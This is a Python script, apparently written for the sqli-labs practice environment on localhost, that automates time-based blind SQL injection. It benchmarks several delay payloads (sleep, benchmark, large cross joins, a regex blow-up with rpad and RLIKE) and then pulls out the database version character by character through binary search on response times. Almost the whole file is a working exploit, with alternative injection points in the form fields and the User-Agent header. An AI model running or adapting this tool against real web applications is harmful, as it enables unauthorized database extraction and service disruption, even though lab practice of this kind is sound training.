import requests
import time

DELTA = 1.00
TARGET = "version()"

BASE_URL = "http://localhost/Less-5/?id={}"
def _apply(payload):
  return requests.get(BASE_URL.format(payload))

# BASE_URL = "http://localhost/Less-11/"
# def _apply(payload):
#   return requests.post(BASE_URL, {
#     "uname": payload,
#     "passwd": "password",
#     "submit": "Submit"
#   })

# BASE_URL = "http://localhost/Less-18/"
# def _apply(payload):
#   return requests.post(BASE_URL, {
#     "uname": "uname",
#     "passwd": "password",
#     "submit": "Submit"
#   }, headers={
#     "User-Agent": payload
#   })

def gen_payload(vec):
  return "-1'or {} --+".format(vec)


#! --------------- NO NEED TO EDIT BELOW ---------------

def run_benchmark():
  delay_payload_sets = [
    "if({},sleep(1),null)",
    "if({},benchmark(50000000,md5('kaf')),null)",
    "if({},SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C,null)",
    "if({},concat(rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a'),rpad(1,99999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',null)"
  ]

  payload_benchmarked = []
  for delayed in delay_payload_sets:
    start = time.time()
    print("[BENCHMARK] Running test for `{}`, t:{}".format(delayed[:75], start))
    _apply(gen_payload(delayed.format(1)))
    end = time.time()
    if end - start > 1:
      payload_benchmarked.append((delayed, end - start))
  payload_benchmarked.sort(key=lambda x: x[1])
  return payload_benchmarked

avil_pays = run_benchmark()
if(avil_pays==[]):
  print("[FAILED] No available payloads found!")
  exit()
delayed_payload = lambda vec: gen_payload(avil_pays[0][0].format(vec))

def _if(condition):
  s = time.time()
  _apply(delayed_payload(condition))
  e = time.time()
  return (e - s) >= avil_pays[0][1]-DELTA

def time_sqli(target):
  bit = 1
  while True:
    ret = -1;  # 未搜索到数据返回-1下标
    start = 0
    end = 127
    while (start <= end):
      mid = start + ((end - start) >> 1)  # 直接平均可能会溢出，所以用这个算法
      if(_if("ascii(substr({},{},1))>{}".format(target, bit, mid))):
        start = mid + 1
      elif(_if("ascii(substr({},{},1))<{}".format(target, bit, mid))):
        end = mid - 1
      else:
          ret = mid
          break
    if(ret == -1):
      print("\n[INFO] No more characters found, stopping.")
      break
    else:
      print(chr(ret), end='', flush=True)
    bit += 1
  return ret
  
time_sqli(TARGET)
